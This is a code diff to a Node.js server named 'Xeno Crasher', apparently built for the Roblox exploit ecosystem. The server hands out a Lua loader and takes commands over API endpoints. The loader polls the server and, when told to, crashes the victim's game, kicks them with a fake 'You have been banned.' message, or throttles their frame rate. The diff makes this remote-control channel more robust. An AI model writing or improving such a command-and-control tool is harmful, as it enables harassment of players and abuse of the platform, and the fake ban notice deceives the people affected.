@@ -20,7 +20,7 @@ const players = new Map();
 // LOADER SCRIPT
 // ============================================
 app.get('/loader.lua', (req, res) => {
-    const loader = `--[[ Xeno Crasher - WORKING ]]--
+    const loader = `--[[ Xeno Crasher - FIXED ]]--
 local BASE = "${PUBLIC_URL}"
 local KEY = "xenooooo"
 
@@ -178,25 +178,33 @@ local function poll()
     local result = sendRequest("GET", url, nil)
     
     if result and result ~= "" then
-        local data = HttpService:JSONDecode(result)
-        print("📥 Received: " .. HttpService:JSONEncode(data))
+        -- ✅ Try to parse JSON, but handle errors
+        local success, data = pcall(function()
+            return HttpService:JSONDecode(result)
+        end)
         
-        if data.fps_limit then
-            setFPSLimit(tonumber(data.fps_limit))
+        if success and data then
+            print("📥 Received: " .. HttpService:JSONEncode(data))
+            
+            if data.fps_limit then
+                setFPSLimit(tonumber(data.fps_limit))
+            else
+                setFPSLimit(nil)
+            end
+            
+            if data.crash == true then
+                print("💥 CRASH!")
+                crashGame()
+            end
+            
+            if data.kick == true then
+                print("👢 KICK!")
+                local kickMessage = data.kick_message or "You have been banned."
+                task.wait(0.5)
+                LP:Kick(kickMessage)
+            end
         else
-            setFPSLimit(nil)
-        end
-        
-        if data.crash == true then
-            print("💥 CRASH!")
-            crashGame()
-        end
-        
-        if data.kick == true then
-            print("👢 KICK!")
-            local kickMessage = data.kick_message or "You have been banned."
-            task.wait(0.5)
-            LP:Kick(kickMessage)
+            print("⚠️ Failed to parse JSON: " .. tostring(result))
         end
     end
     
@@ -230,7 +238,7 @@ print("👤 Player: " .. LP.Name)`;
 });
 
 // ============================================
-// API ENDPOINTS
+// ✅ FIXED: API ENDPOINTS (ALL RETURN JSON)
 // ============================================
 
 app.get('/api/public/heartbeat', (req, res) => {
@@ -255,7 +263,6 @@ app.get('/api/public/heartbeat', (req, res) => {
         fps_limit: false
     });
     
-    console.log(`❤️ Heartbeat from: ${username || userId}`);
     res.json({ status: 'ok' });
 });
 
@@ -279,7 +286,6 @@ app.post('/api/public/heartbeat', (req, res) => {
         fps_limit: false
     });
     
-    console.log(`❤️ Heartbeat from: ${data.username || userId}`);
     res.json({ status: 'ok' });
 });
 
@@ -325,9 +331,13 @@ app.post('/api/command', (req, res) => {
 
 app.get('/api/public/command', (req, res) => {
     const userId = req.query.user_id;
-    if (!userId) return res.status(400).json({ error: 'Missing user_id' });
+    if (!userId) {
+        return res.status(400).json({ error: 'Missing user_id' });
+    }
     const p = players.get(String(userId));
-    if (!p) return res.json({});
+    if (!p) {
+        return res.json({});
+    }
     
     const response = {};
     
@@ -350,10 +360,16 @@ app.get('/api/public/command', (req, res) => {
     res.json(response);
 });
 
+// ============================================
+// SERVE FRONTEND
+// ============================================
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
+// ============================================
+// START SERVER
+// ============================================
 app.listen(PORT, () => {
     console.log(`🚀 Xeno Crasher Server running on port ${PORT}`);
     console.log(`📍 Public URL: ${PUBLIC_URL}`);
